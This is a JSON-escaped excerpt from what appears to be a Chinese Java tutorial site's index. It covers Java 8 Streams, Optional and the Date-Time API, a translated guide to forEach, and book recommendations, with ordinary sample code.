static\u0026lt;T\u0026gt; Stream\u0026lt;T\u0026gt; of(T t) /** * 返回其元素是指定值的顺序流。 */ public static\u0026lt;T\u0026gt; Stream\u0026lt;T\u0026gt; of(T... values) { return Arrays.stream(values); } /** * 过滤，返回由与给定predicate匹配的该流的元素组成的流 */ Stream\u0026lt;T\u0026gt; filter(Predicate\u0026lt;? super T\u0026gt; predicate); /** * 此流的所有元素是否与提供的predicate匹配。 */ boolean allMatch(Predicate\u0026lt;? super T\u0026gt; predicate) /** * 此流任意元素是否有与提供的predicate匹配。 */ boolean anyMatch(Predicate\u0026lt;? super T\u0026gt; predicate); /** * 返回一个 Stream的构建器。 */ public static\u0026lt;T\u0026gt; Builder\u0026lt;T\u0026gt; builder(); /** * 使用 Collector对此流的元素进行归纳 */ \u0026lt;R, A\u0026gt; R collect(Collector\u0026lt;? super T, A, R\u0026gt; collector); /** * 返回此流中的元素数。 */ long count(); /** * 返回由该流的不同元素（根据 Object.equals(Object) ）组成的流。 */ Stream\u0026lt;T\u0026gt; distinct(); /** * 遍历 */ void forEach(Consumer\u0026lt;? super T\u0026gt; action); /** * 用于获取指定数量的流，截短长度不能超过 maxSize 。 */ Stream\u0026lt;T\u0026gt; limit(long maxSize); /** * 用于映射每个元素到对应的结果 */ \u0026lt;R\u0026gt; Stream\u0026lt;R\u0026gt; map(Function\u0026lt;? super T, ? extends R\u0026gt; mapper); /** * 根据提供的 Comparator进行排序。 */ Stream\u0026lt;T\u0026gt; sorted(Comparator\u0026lt;? super T\u0026gt; comparator); /** * 在丢弃流的第一个 n元素后，返回由该流的 n元素组成的流。 */ Stream\u0026lt;T\u0026gt; skip(long n); /** * 返回一个包含此流的元素的数组。 */ Object[] toArray(); /** * 使用提供的 generator函数返回一个包含此流的元素的数组，以分配返回的数组，以及分区执行或调整大小可能需要的任何其他数组。 */ \u0026lt;A\u0026gt; A[] toArray(IntFunction\u0026lt;A[]\u0026gt; generator); /** * 合并流 */ public static \u0026lt;T\u0026gt; Stream\u0026lt;T\u0026gt; concat(Stream\u0026lt;? extends T\u0026gt; a, Stream\u0026lt;? extends T\u0026gt; b) 实战    本文列出 Stream 具有代表性的方法之使用，更多的使用方法还是要看 Api。\n@Test public void test() { List\u0026lt;String\u0026gt; strings = Arrays.asList(\u0026#34;abc\u0026#34;, \u0026#34;def\u0026#34;, \u0026#34;gkh\u0026#34;, \u0026#34;abc\u0026#34;); //返回符合条件的stream  Stream\u0026lt;String\u0026gt; stringStream = strings.stream().filter(s -\u0026gt; \u0026#34;abc\u0026#34;.equals(s)); //计算流符合条件的流的数量  long count = stringStream.count(); //forEach遍历-\u0026gt;打印元素  strings.stream().forEach(System.out::println); //limit 获取到1个元素的stream  Stream\u0026lt;String\u0026gt; limit = strings.stream().limit(1); //toArray 比如我们想看这个limitStream里面是什么，比如转换成String[],比如循环  String[] array = limit.toArray(String[]::new); //map 对每个元素进行操作返回新流  Stream\u0026lt;String\u0026gt; map = strings.stream().map(s -\u0026gt; s + \u0026#34;22\u0026#34;); //sorted 排序并打印  strings.stream().sorted().forEach(System.out::println); //Collectors collect 把abc放入容器中  List\u0026lt;String\u0026gt; collect = strings.stream().filter(string -\u0026gt; \u0026#34;abc\u0026#34;.equals(string)).collect(Collectors.toList()); //把list转为string，各元素用，号隔开  String mergedString = strings.stream().filter(string -\u0026gt; !string.isEmpty()).collect(Collectors.joining(\u0026#34;,\u0026#34;)); //对数组的统计，比如用  List\u0026lt;Integer\u0026gt; number = Arrays.asList(1, 2, 5, 4); IntSummaryStatistics statistics = number.stream().mapToInt((x) -\u0026gt; x).summaryStatistics(); System.out.println(\u0026#34;列表中最大的数 : \u0026#34;+statistics.getMax()); System.out.println(\u0026#34;列表中最小的数 : \u0026#34;+statistics.getMin()); System.out.println(\u0026#34;平均数 : \u0026#34;+statistics.getAverage()); System.out.println(\u0026#34;所有数之和 : \u0026#34;+statistics.getSum()); //concat 合并流  List\u0026lt;String\u0026gt; strings2 = Arrays.asList(\u0026#34;xyz\u0026#34;, \u0026#34;jqx\u0026#34;); Stream.concat(strings2.stream(),strings.stream()).count(); //注意 一个Stream只能操作一次，不能断开，否则会报错。  Stream stream = strings.stream(); //第一次使用  stream.limit(2); //第二次使用  stream.forEach(System.out::println); //报错 java.lang.IllegalStateException: stream has already been operated upon or closed  //但是可以这样, 连续使用  stream.limit(2).forEach(System.out::println); } 延迟执行    在执行返回 Stream 的方法时，并不立刻执行，而是等返回一个非 Stream 的方法后才执行。因为拿到 Stream 并不能直接用，而是需要处理成一个常规类型。这里的 Stream 可以想象成是二进制流（2 个完全不一样的东东），拿到也看不懂。\n我们下面分解一下 filter 方法。\n@Test public void laziness(){ List\u0026lt;String\u0026gt; strings = Arrays.asList(\u0026#34;abc\u0026#34;, \u0026#34;def\u0026#34;, \u0026#34;gkh\u0026#34;, \u0026#34;abc\u0026#34;); Stream\u0026lt;Integer\u0026gt; stream = strings.stream().filter(new Predicate() { @Override public boolean test(Object o) { System.out.println(\u0026#34;Predicate.test 执行\u0026#34;); return true; } }); System.out.println(\u0026#34;count 执行\u0026#34;); stream.count(); } /*-------执行结果--------*/ count 执行 Predicate.test 执行 Predicate.test 执行 Predicate.test 执行 Predicate.test 执行 按执行顺序应该是先打印 4 次「Predicate.test 执行」，再打印「count 执行」。实际结果恰恰相反。说明 filter 中的方法并没有立刻执行，而是等调用count()方法后才执行。\n上面都是串行 Stream 的实例。并行 parallelStream 在使用方法上和串行一样。主要区别是 parallelStream 可多线程执行，是基于 ForkJoin 框架实现的，有时间大家可以了解一下 ForkJoin 框架和 ForkJoinPool。这里可以简单的理解它是通过线程池来实现的，这样就会涉及到线程安全，线程消耗等问题。下面我们通过代码来体验一下并行流的多线程执行。\n@Test public void parallelStreamTest(){ List\u0026lt;Integer\u0026gt; numbers = Arrays.asList(1, 2, 5, 4); numbers.parallelStream() .forEach(num-\u0026gt;System.out.println(Thread.currentThread().getName()+\u0026#34;\u0026gt;\u0026gt;\u0026#34;+num)); } //执行结果 main\u0026gt;\u0026gt;5 ForkJoinPool.commonPool-worker-2\u0026gt;\u0026gt;4 ForkJoinPool.commonPool-worker-11\u0026gt;\u0026gt;1 ForkJoinPool.commonPool-worker-9\u0026gt;\u0026gt;2 从结果中我们看到，for-each 用到的是多线程。\n小结    从源码和实例中我们可以总结出一些 stream 的特点\n 通过简单的链式编程，使得它可以方便地对遍历处理后的数据进行再处理。 方法参数都是函数式接口类型 一个 Stream 只能操作一次，操作完就关闭了，继续使用这个 stream 会报错。 Stream 不保存数据，不改变数据源  Optional    在阿里巴巴开发手册关于 Optional 的介绍中这样写到：\n 防止 NPE，是程序员的基本修养，注意 NPE 产生的场景：\n1） 返回类型为基本数据类型，return 包装数据类型的对象时，自动拆箱有可能产生 NPE。\n反例：public int f() { return Integer 对象}， 如果为 null，自动解箱抛 NPE。\n2） 数据库的查询结果可能为 null。\n3） 集合里的元素即使 isNotEmpty，取出的数据元素也可能为 null。\n4） 远程调用返回对象时，一律要求进行空指针判断，防止 NPE。\n5） 对于 Session 中获取的数据，建议进行 NPE 检查，避免空指针。\n6） 级联调用 obj.getA().getB().getC()；一连串调用，易产生 NPE。\n正例：使用 JDK8 的 Optional 类来防止 NPE 问题。\n 他建议使用 Optional 解决 NPE（java.lang.NullPointerException）问题，它就是为 NPE 而生的，其中可以包含空值或非空值。下面我们通过源码逐步揭开 Optional 的红盖头。\n假设有一个 Zoo 类，里面有个属性 Dog，需求要获取 Dog 的 age。\nclass Zoo { private Dog dog; } class Dog { private int age; } 传统解决 NPE 的办法如下：\nZoo zoo = getZoo(); if(zoo != null){ Dog dog = zoo.getDog(); if(dog != null){ int age = dog.getAge(); System.out.println(age); } } 层层判断对象非空，有人说这种方式很丑陋不优雅，我并不这么认为。反而觉得很整洁，易读，易懂。你们觉得呢？\nOptional 是这样的实现的：\nOptional.ofNullable(zoo).map(o -\u0026gt; o.getDog()).map(d -\u0026gt; d.getAge()).ifPresent(age -\u0026gt; System.out.println(age) ); 是不是简洁了很多呢？\n如何创建一个 Optional    上例中Optional.ofNullable是其中一种创建 Optional 的方式。我们先看一下它的含义和其他创建 Optional 的源码方法。\n/** * Common instance for {@code empty()}. 全局EMPTY对象 */ private static final Optional\u0026lt;?\u0026gt; EMPTY = new Optional\u0026lt;\u0026gt;(); /** * Optional维护的值 */ private final T value; /** * 如果value是null就返回EMPTY，否则就返回of(T) */ public static \u0026lt;T\u0026gt; Optional\u0026lt;T\u0026gt; ofNullable(T value) { return value == null ? empty() : of(value); } /** * 返回 EMPTY 对象 */ public static\u0026lt;T\u0026gt; Optional\u0026lt;T\u0026gt; empty() { Optional\u0026lt;T\u0026gt; t = (Optional\u0026lt;T\u0026gt;) EMPTY; return t; } /** * 返回Optional对象 */ public static \u0026lt;T\u0026gt; Optional\u0026lt;T\u0026gt; of(T value) { return new Optional\u0026lt;\u0026gt;(value); } /** * 私有构造方法，给value赋值 */ private Optional(T value) { this.value = Objects.requireNonNull(value); } /** * 所以如果of(T value) 的value是null，会抛出NullPointerException异常，这样貌似就没处理NPE问题 */ public static \u0026lt;T\u0026gt; T requireNonNull(T obj) { if (obj == null) throw new NullPointerException(); return obj; } ofNullable 方法和of方法唯一区别就是当 value 为 null 时，ofNullable 返回的是EMPTY，of 会抛出 NullPointerException 异常。如果需要把 NullPointerException 暴漏出来就用 of，否则就用 ofNullable。\nmap()相关方法。    /** * 如果value为null，返回EMPTY，否则返回Optional封装的参数值 */ public\u0026lt;U\u0026gt; Optional\u0026lt;U\u0026gt; map(Function\u0026lt;? super T, ? extends U\u0026gt; mapper) { Objects.requireNonNull(mapper); if (!isPresent()) return empty(); else { return Optional.ofNullable(mapper.apply(value)); } } /** * 如果value为null，返回EMPTY，否则返回Optional封装的参数值，如果参数值返回null会抛 NullPointerException */ public\u0026lt;U\u0026gt; Optional\u0026lt;U\u0026gt; flatMap(Function\u0026lt;? super T, Optional\u0026lt;U\u0026gt;\u0026gt; mapper) { Objects.requireNonNull(mapper); if (!isPresent()) return empty(); else { return Objects.requireNonNull(mapper.apply(value)); } } map() 和 flatMap() 有什么区别的？\n1.参数不一样，map 的参数上面看到过，flatMap 的参数是这样\nclass ZooFlat { private DogFlat dog = new DogFlat(); public DogFlat getDog() { return dog; } } class DogFlat { private int age = 1; public Optional\u0026lt;Integer\u0026gt; getAge() { return Optional.ofNullable(age); } } ZooFlat zooFlat = new ZooFlat(); Optional.ofNullable(zooFlat).map(o -\u0026gt; o.getDog()).flatMap(d -\u0026gt; d.getAge()).ifPresent(age -\u0026gt; System.out.println(age) ); 2.flatMap() 参数返回值如果是 null 会抛 NullPointerException，而 map() 返回EMPTY。\n判断 value 是否为 null    /** * value是否为null */ public boolean isPresent() { return value != null; } /** * 如果value不为null执行consumer.accept */ public void ifPresent(Consumer\u0026lt;? super T\u0026gt; consumer) { if (value != null) consumer.accept(value); } 获取 value    /** * Return the value if present, otherwise invoke {@code other} and return * the result of that invocation. * 如果value != null 返回value，否则返回other的执行结果 */ public T orElseGet(Supplier\u0026lt;? extends T\u0026gt; other) { return value != null ? value : other.get(); } /** * 如果value != null 返回value，否则返回T */ public T orElse(T other) { return value != null ? value : other; } /** * 如果value != null 返回value，否则抛出参数返回的异常 */ public \u0026lt;X extends Throwable\u0026gt; T orElseThrow(Supplier\u0026lt;? extends X\u0026gt; exceptionSupplier) throws X { if (value != null) { return value; } else { throw exceptionSupplier.get(); } } /** * value为null抛出NoSuchElementException，不为空返回value。 */ public T get() { if (value == null) { throw new NoSuchElementException(\u0026#34;No value present\u0026#34;); } return value; } 过滤值    /** * 1. 如果是empty返回empty * 2. predicate.test(value)==true 返回this，否则返回empty */ public Optional\u0026lt;T\u0026gt; filter(Predicate\u0026lt;? super T\u0026gt; predicate) { Objects.requireNonNull(predicate); if (!isPresent()) return this; else return predicate.test(value) ? this : empty(); } 小结    看完 Optional 源码，Optional 的方法真的非常简单，值得注意的是如果坚决不想看见 NPE，就不要用 of() 、 get() 、flatMap(..)。最后再综合用一下 Optional 的高频方法。\nOptional.ofNullable(zoo).map(o -\u0026gt; o.getDog()).map(d -\u0026gt; d.getAge()).filter(v-\u0026gt;v==1).orElse(3); Date-Time API    这是对java.util.Date强有力的补充，解决了 Date 类的大部分痛点：\n 非线程安全 时区处理麻烦 各种格式化、和时间计算繁琐 设计有缺陷，Date 类同时包含日期和时间；还有一个 java.sql.Date，容易混淆。  我们从常用的时间实例来对比 java.util.Date 和新 Date 有什么区别。用java.util.Date的代码该改改了。\njava.time 主要类    java.util.Date 既包含日期又包含时间，而 java.time 把它们进行了分离\nLocalDateTime.class //日期+时间 format: yyyy-MM-ddTHH:mm:ss.SSS LocalDate.class //日期 format: yyyy-MM-dd LocalTime.class //时间 format: HH:mm:ss 格式化    Java 8 之前:\npublic void oldFormat(){ Date now = new Date(); //format yyyy-MM-dd HH:mm:ss  SimpleDateFormat sdf = new SimpleDateFormat(\u0026#34;yyyy-MM-dd\u0026#34;); String date = sdf.format(now); System.out.println(String.format(\u0026#34;date format : %s\u0026#34;, date)); //format HH:mm:ss  SimpleDateFormat sdft = new SimpleDateFormat(\u0026#34;HH:mm:ss\u0026#34;); String time = sdft.format(now); System.out.println(String.format(\u0026#34;time format : %s\u0026#34;, time)); //format yyyy-MM-dd HH:mm:ss  SimpleDateFormat sdfdt = new SimpleDateFormat(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); String datetime = sdfdt.format(now); System.out.println(String.format(\u0026#34;dateTime format : %s\u0026#34;, datetime)); } Java 8 之后:\npublic void newFormat(){ //format yyyy-MM-dd  LocalDate date = LocalDate.now(); System.out.println(String.format(\u0026#34;date format : %s\u0026#34;, date)); //format HH:mm:ss  LocalTime time = LocalTime.now().withNano(0); System.out.println(String.format(\u0026#34;time format : %s\u0026#34;, time)); //format yyyy-MM-dd HH:mm:ss  LocalDateTime dateTime = LocalDateTime.now(); DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); String dateTimeStr = dateTime.format(dateTimeFormatter); System.out.println(String.format(\u0026#34;dateTime format : %s\u0026#34;, dateTimeStr)); } 字符串转日期格式    Java 8 之前:\n//已弃用 Date date = new Date(\u0026#34;2021-01-26\u0026#34;); //替换为 SimpleDateFormat sdf = new SimpleDateFormat(\u0026#34;yyyy-MM-dd\u0026#34;); Date date1 = sdf.parse(\u0026#34;2021-01-26\u0026#34;); Java 8 之后:\nLocalDate date = LocalDate.of(2021, 1, 26); LocalDate.parse(\u0026#34;2021-01-26\u0026#34;); LocalDateTime dateTime = LocalDateTime.of(2021, 1, 26, 12, 12, 22); LocalDateTime.parse(\u0026#34;2021-01-26 12:12:22\u0026#34;); LocalTime time = LocalTime.of(12, 12, 22); LocalTime.parse(\u0026#34;12:12:22\u0026#34;); Java 8 之前 转换都需要借助 SimpleDateFormat 类，而Java 8 之后只需要 LocalDate、LocalTime、LocalDateTime的 of 或 parse 方法。\n日期计算    下面仅以一周后日期为例，其他单位（年、月、日、1/2 日、时等等）大同小异。另外，这些单位都在 java.time.temporal.ChronoUnit 枚举中定义。\nJava 8 之前:\npublic void afterDay(){ //一周后的日期  SimpleDateFormat formatDate = new SimpleDateFormat(\u0026#34;yyyy-MM-dd\u0026#34;); Calendar ca = Calendar.getInstance(); ca.add(Calendar.DATE, 7); Date d = ca.getTime(); String after = formatDate.format(d); System.out.println(\u0026#34;一周后日期：\u0026#34; + after); //算两个日期间隔多少天，计算间隔多少年，多少月方法类似  String dates1 = \u0026#34;2021-12-23\u0026#34;; String dates2 = \u0026#34;2021-02-26\u0026#34;; SimpleDateFormat format = new SimpleDateFormat(\u0026#34;yyyy-MM-dd\u0026#34;); Date date1 = format.parse(dates1); Date date2 = format.parse(dates2); int day = (int) ((date1.getTime() - date2.getTime()) / (1000 * 3600 * 24)); System.out.println(dates2 + \u0026#34;和\u0026#34; + dates2 + \u0026#34;相差\u0026#34; + day + \u0026#34;天\u0026#34;); //结果：2021-12-23和2021-12-23相差300天 } Java 8 之后:\npublic void pushWeek(){ //一周后的日期  LocalDate localDate = LocalDate.now(); //方法1  LocalDate after = localDate.plus(1, ChronoUnit.WEEKS); //方法2  LocalDate after2 = localDate.plusWeeks(1); System.out.println(\u0026#34;一周后日期：\u0026#34; + after); //算两个日期间隔多少天，计算间隔多少年，多少月  LocalDate date1 = LocalDate.parse(\u0026#34;2021-02-26\u0026#34;); LocalDate date2 = LocalDate.parse(\u0026#34;2021-12-23\u0026#34;); Period period = Period.between(date1, date2); System.out.println(\u0026#34;date1 到 date2 相隔：\u0026#34; + period.getYears() + \u0026#34;年\u0026#34; + period.getMonths() + \u0026#34;月\u0026#34; + period.getDays() + \u0026#34;天\u0026#34;); //打印结果是 “date1 到 date2 相隔：0年9月27天”  //这里period.getDays()得到的天是抛去年月以外的天数，并不是总天数  //如果要获取纯粹的总天数应该用下面的方法  long day = date2.toEpochDay() - date1.toEpochDay(); System.out.println(date2 + \u0026#34;和\u0026#34; + date2 + \u0026#34;相差\u0026#34; + day + \u0026#34;天\u0026#34;); //打印结果：2021-12-23和2021-12-23相差300天 } 获取指定日期    除了日期计算繁琐，获取特定一个日期也很麻烦，比如获取本月最后一天，第一天。\nJava 8 之前:\npublic void getDay() { SimpleDateFormat format = new SimpleDateFormat(\u0026#34;yyyy-MM-dd\u0026#34;); //获取当前月第一天：  Calendar c = Calendar.getInstance(); c.set(Calendar.DAY_OF_MONTH, 1); String first = format.format(c.getTime()); System.out.println(\u0026#34;first day:\u0026#34; + first); //获取当前月最后一天  Calendar ca = Calendar.getInstance(); ca.set(Calendar.DAY_OF_MONTH, ca.getActualMaximum(Calendar.DAY_OF_MONTH)); String last = format.format(ca.getTime()); System.out.println(\u0026#34;last day:\u0026#34; + last); //当年最后一天  Calendar currCal = Calendar.getInstance(); Calendar calendar = Calendar.getInstance(); calendar.clear(); calendar.set(Calendar.YEAR, currCal.get(Calendar.YEAR)); calendar.roll(Calendar.DAY_OF_YEAR, -1); Date time = calendar.getTime(); System.out.println(\u0026#34;last day:\u0026#34; + format.format(time)); } Java 8 之后:\npublic void getDayNew() { LocalDate today = LocalDate.now(); //获取当前月第一天：  LocalDate firstDayOfThisMonth = today.with(TemporalAdjusters.firstDayOfMonth()); // 取本月最后一天  LocalDate lastDayOfThisMonth = today.with(TemporalAdjusters.lastDayOfMonth()); //取下一天：  LocalDate nextDay = lastDayOfThisMonth.plusDays(1); //当年最后一天  LocalDate lastday = today.with(TemporalAdjusters.lastDayOfYear()); //2021年最后一个周日，如果用Calendar是不得烦死。  LocalDate lastMondayOf2021 = LocalDate.parse(\u0026#34;2021-12-31\u0026#34;).with(TemporalAdjusters.lastInMonth(DayOfWeek.SUNDAY)); } java.time.temporal.TemporalAdjusters 里面还有很多便捷的算法，这里就不带大家看 Api 了，都很简单，看了秒懂。\nJDBC 和 java8    现在 jdbc 时间类型和 java8 时间类型对应关系是\n Date \u0026mdash;\u0026gt; LocalDate Time \u0026mdash;\u0026gt; LocalTime Timestamp \u0026mdash;\u0026gt; LocalDateTime  而之前统统对应 Date，也只有 Date。\n时区     时区：正式的时区划分为每隔经度 15° 划分一个时区，全球共 24 个时区，每个时区相差 1 小时。但为了行政上的方便，常将 1 个国家或 1 个省份划在一起，比如我国幅员宽广，大概横跨 5 个时区，实际上只用东八时区的标准时即北京时间为准。\n java.util.Date 对象实质上存的是 1970 年 1 月 1 日 0 点（ GMT）至 Date 对象所表示时刻所经过的毫秒数。也就是说不管在哪个时区 new Date，它记录的毫秒数都一样，和时区无关。但在使用上应该把它转换成当地时间，这就涉及到了时间的国际化。java.util.Date 本身并不支持国际化，需要借助 TimeZone。\n//北京时间：Wed Jan 27 14:05:29 CST 2021 Date date = new Date(); SimpleDateFormat bjSdf = new SimpleDateFormat(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); //北京时区 bjSdf.setTimeZone(TimeZone.getTimeZone(\u0026#34;Asia/Shanghai\u0026#34;)); System.out.println(\u0026#34;毫秒数:\u0026#34; + date.getTime() + \u0026#34;, 北京时间:\u0026#34; + bjSdf.format(date)); //东京时区 SimpleDateFormat tokyoSdf = new SimpleDateFormat(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); tokyoSdf.setTimeZone(TimeZone.getTimeZone(\u0026#34;Asia/Tokyo\u0026#34;)); // 设置东京时区 System.out.println(\u0026#34;毫秒数:\u0026#34; + date.getTime() + \u0026#34;, 东京时间:\u0026#34; + tokyoSdf.format(date)); //如果直接print会自动转成当前时区的时间 System.out.println(date); //Wed Jan 27 14:05:29 CST 2021 在新特性中引入了 java.time.ZonedDateTime  来表示带时区的时间。它可以看成是 LocalDateTime + ZoneId。\n//当前时区时间 ZonedDateTime zonedDateTime = ZonedDateTime.now(); System.out.println(\u0026#34;当前时区时间: \u0026#34; + zonedDateTime); //东京时间 ZoneId zoneId = ZoneId.of(ZoneId.SHORT_IDS.get(\u0026#34;JST\u0026#34;)); ZonedDateTime tokyoTime = zonedDateTime.withZoneSameInstant(zoneId); System.out.println(\u0026#34;东京时间: \u0026#34; + tokyoTime); // ZonedDateTime 转 LocalDateTime LocalDateTime localDateTime = tokyoTime.toLocalDateTime(); System.out.println(\u0026#34;东京时间转当地时间: \u0026#34; + localDateTime); //LocalDateTime 转 ZonedDateTime ZonedDateTime localZoned = localDateTime.atZone(ZoneId.systemDefault()); System.out.println(\u0026#34;本地时区时间: \u0026#34; + localZoned); //打印结果 当前时区时间: 2021-01-27T14:43:58.735+08:00[Asia/Shanghai] 东京时间: 2021-01-27T15:43:58.735+09:00[Asia/Tokyo] 东京时间转当地时间: 2021-01-27T15:43:58.735 当地时区时间: 2021-01-27T15:53:35.618+08:00[Asia/Shanghai] 小结    通过上面比较新老 Date 的不同，当然只列出部分功能上的区别，更多功能还得自己去挖掘。总之 date-time-api 给日期操作带来了福利。在日常工作中遇到 date 类型的操作，第一考虑的是 date-time-api，实在解决不了再考虑老的 Date。\n总结    我们梳理总结的 java 8 新特性有\n Interface \u0026amp; functional Interface Lambda Stream Optional Date time-api  这些都是开发当中比较常用的特性。梳理下来发现它们真香，而我却没有更早的应用。总觉得学习 java 8 新特性比较麻烦，一直使用老的实现方式。其实这些新特性几天就可以掌握，一但掌握，效率会有很大的提高。其实我们涨工资也是涨的学习的钱，不学习终究会被淘汰，35 岁危机会提前来临。\n"},{"id":220,"href":"/java/new-features/Java8foreach%E6%8C%87%E5%8D%97/","title":"Java8foreach指南","parent":"new-features","content":" 本文由 JavaGuide 翻译，原文地址：https://www.baeldung.com/foreach-java\n 1 概述    在Java 8中引入的forEach循环为程序员提供了一种新的，简洁而有趣的迭代集合的方式。\n在本文中，我们将看到如何将forEach与集合一起使用，它采用何种参数以及此循环与增强的for循环的不同之处。\n2 基础知识    public interface Collection\u0026lt;E\u0026gt; extends Iterable\u0026lt;E\u0026gt; Collection 接口实现了 Iterable 接口，而 Iterable 接口在 Java 8开始具有一个新的 API：\nvoid forEach(Consumer\u0026lt;? super T\u0026gt; action)//对 Iterable的每个元素执行给定的操作，直到所有元素都被处理或动作引发异常。 使用forEach，我们可以迭代一个集合并对每个元素执行给定的操作，就像任何其他迭代器一样。\n例如，迭代和打印字符串集合的for循环版本：\nfor (String name : names) { System.out.println(name); } 我们可以使用forEach写这个 ：\nnames.forEach(name -\u0026gt; { System.out.println(name); }); 3.使用forEach方法    3.1 匿名类    我们使用 forEach迭代集合并对每个元素执行特定操作。要执行的操作包含在实现Consumer接口的类中，并作为参数传递给forEach 。\n所述消费者接口是一个功能接口(具有单个抽象方法的接口）。它接受输入并且不返回任何结果。\nConsumer 接口定义如下：\n@FunctionalInterface public interface Consumer { void accept(T t); } 任何实现，例如，只是打印字符串的消费者：\nConsumer\u0026lt;String\u0026gt; printConsumer = new Consumer\u0026lt;String\u0026gt;() { public void accept(String name) { System.out.println(name); }; }; 可以作为参数传递给forEach：\nnames.forEach(printConsumer); 但这不是通过消费者和使用forEach API 创建操作的唯一方法。让我们看看我们将使用forEach方法的另外2种最流行的方式：\n3.2 Lambda表达式    Java 8功能接口的主要优点是我们可以使用Lambda表达式来实例化它们，并避免使用庞大的匿名类实现。\n由于 Consumer 接口属于函数式接口，我们可以通过以下形式在Lambda中表达它：\n(argument) -\u0026gt; { body } name -\u0026gt; System.out.println(name) names.forEach(name -\u0026gt; System.out.println(name)); 3.3 方法参考    我们可以使用方法引用语法而不是普通的Lambda语法，其中已存在一个方法来对类执行操作：\nnames.forEach(System.out::println); 4.forEach在集合中的使用    4.1.迭代集合    任何类型Collection的可迭代 - 列表，集合，队列 等都具有使用forEach的相同语法。\n因此，正如我们已经看到的，迭代列表的元素：\nList\u0026lt;String\u0026gt; names = Arrays.asList(\u0026#34;Larry\u0026#34;, \u0026#34;Steve\u0026#34;, \u0026#34;James\u0026#34;); names.forEach(System.out::println); 同样对于一组：\nSet\u0026lt;String\u0026gt; uniqueNames = new HashSet\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;Larry\u0026#34;, \u0026#34;Steve\u0026#34;, \u0026#34;James\u0026#34;)); uniqueNames.forEach(System.out::println); 或者让我们说一个队列也是一个集合：\nQueue\u0026lt;String\u0026gt; namesQueue = new ArrayDeque\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;Larry\u0026#34;, \u0026#34;Steve\u0026#34;, \u0026#34;James\u0026#34;)); namesQueue.forEach(System.out::println); 4.2.迭代Map - 使用Map的forEach    Map没有实现Iterable接口，但它提供了自己的forEach 变体，它接受BiConsumer。*\nMap\u0026lt;Integer, String\u0026gt; namesMap = new HashMap\u0026lt;\u0026gt;(); namesMap.put(1, \u0026#34;Larry\u0026#34;); namesMap.put(2, \u0026#34;Steve\u0026#34;); namesMap.put(3, \u0026#34;James\u0026#34;); namesMap.forEach((key, value) -\u0026gt; System.out.println(key + \u0026#34; \u0026#34; + value)); 4.3.迭代一个Map - 通过迭代entrySet    namesMap.entrySet().forEach(entry -\u0026gt; System.out.println(entry.getKey() + \u0026#34; \u0026#34; + entry.getValue())); "},{"id":221,"href":"/java/new-features/Java8%E6%95%99%E7%A8%8B%E6%8E%A8%E8%8D%90/","title":"Java8教程推荐","parent":"new-features","content":"书籍     《Java8 In Action》 《写给大忙人看的Java SE 8》  上述书籍的PDF版本见 https://shimo.im/docs/CPB0PK05rP4CFmI2/ 中的 “Java 书籍推荐”。\n开源文档     【译】Java 8 简明教程：https://github.com/wizardforcel/modern-java-zh 30 seconds of java8: https://github.com/biezhi/30-seconds-of-java8  视频     尚硅谷 Java 8 新特性  视频资源见： https://shimo.im/docs/CPB0PK05rP4CFmI2/ 。\n"},{"id":222,"href":"/java/new-features/Java8%E6%96%B0%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/","title":"Java8新特性总结","parent":"new-features","content":"点击关注公众号及时获取笔主最新更新文章，并可免费领取本文档配套的《Java面试突击》以及Java工程师必备学习资源。\n随着 Java 8 的普及度越来越高，很多人都提到面试中关于Java 8 也是非常常问的知识点。应各位要求和需要，我打算对这部分知识做一个总结。本来准备自己总结的，后面看到Github 上有一个相关的仓库，地址： https://github.com/winterbe/java8-tutorial。这个仓库是英文的，我对其进行了翻译并添加和修改了部分内容，下面是正文了。\n Java 8 Tutorial  接口的默认方法(Default Methods for Interfaces) Lambda表达式(Lambda expressions) 函数式接口(Functional Interfaces) 方法和构造函数引用(Method and Constructor References) Lamda 表达式作用域(Lambda Scopes)  访问局部变量 访问字段和静态变量 访问默认接口方法   内置函数式接口(Built-in Functional Interfaces)  Predicate Function Supplier Consumer Comparator   Optional Streams(流)  Filter(过滤) Sorted(排序) Map(映射) Match(匹配) Count(计数) Reduce(规约)   Parallel Streams(并行流)  Sequential Sort(串行排序) Parallel Sort(并行排序)   Maps Date API(日期相关API)  Clock Timezones(时区) LocalTime(本地时间) LocalDate(本地日期) LocalDateTime(本地日期时间)   Annotations(注解) Where to go from here?    Java 8 Tutorial    欢迎阅读我对Java 8的介绍。本教程将逐步指导您完成所有新语言功能。 在简短的代码示例的基础上，您将学习如何使用默认接口方法，lambda表达式，方法引用和可重复注释。 在本文的最后，您将熟悉最新的 API 更改，如流，函数式接口(Functional Interfaces)，Map 类的扩展和新的 Date API。 没有大段枯燥的文字，只有一堆注释的代码片段。\n接口的默认方法(Default Methods for Interfaces)    Java 8使我们能够通过使用 default 关键字向接口添加非抽象方法实现。 此功能也称为虚拟扩展方法。\n第一个例子：\ninterface Formula{ double calculate(int a); default double sqrt(int a) { return Math.sqrt(a); } } Formula 接口中除了抽象方法计算接口公式还定义了默认方法 sqrt。 实现该接口的类只需要实现抽象方法 calculate。 默认方法sqrt 可以直接使用。当然你也可以直接通过接口创建对象，然后实现接口中的默认方法就可以了，我们通过代码演示一下这种方式。\npublic class Main { public static void main(String[] args) { // 通过匿名内部类方式访问接口  Formula formula = new Formula() { @Override public double calculate(int a) { return sqrt(a * 100); } }; System.out.println(formula.calculate(100)); // 100.0  System.out.println(formula.sqrt(16)); // 4.0  } } formula 是作为匿名对象实现的。该代码非常容易理解，6行代码实现了计算 sqrt(a * 100)。在下一节中，我们将会看到在 Java 8 中实现单个方法对象有一种更好更方便的方法。\n译者注： 不管是抽象类还是接口，都可以通过匿名内部类的方式访问。不能通过抽象类或者接口直接创建对象。对于上面通过匿名内部类方式访问接口，我们可以这样理解：一个内部类实现了接口里的抽象方法并且返回一个内部类对象，之后我们让接口的引用来指向这个对象。\nLambda表达式(Lambda expressions)    首先看看在老版本的Java中是如何排列字符串的：\nList\u0026lt;String\u0026gt; names = Arrays.asList(\u0026#34;peter\u0026#34;, \u0026#34;anna\u0026#34;, \u0026#34;mike\u0026#34;, 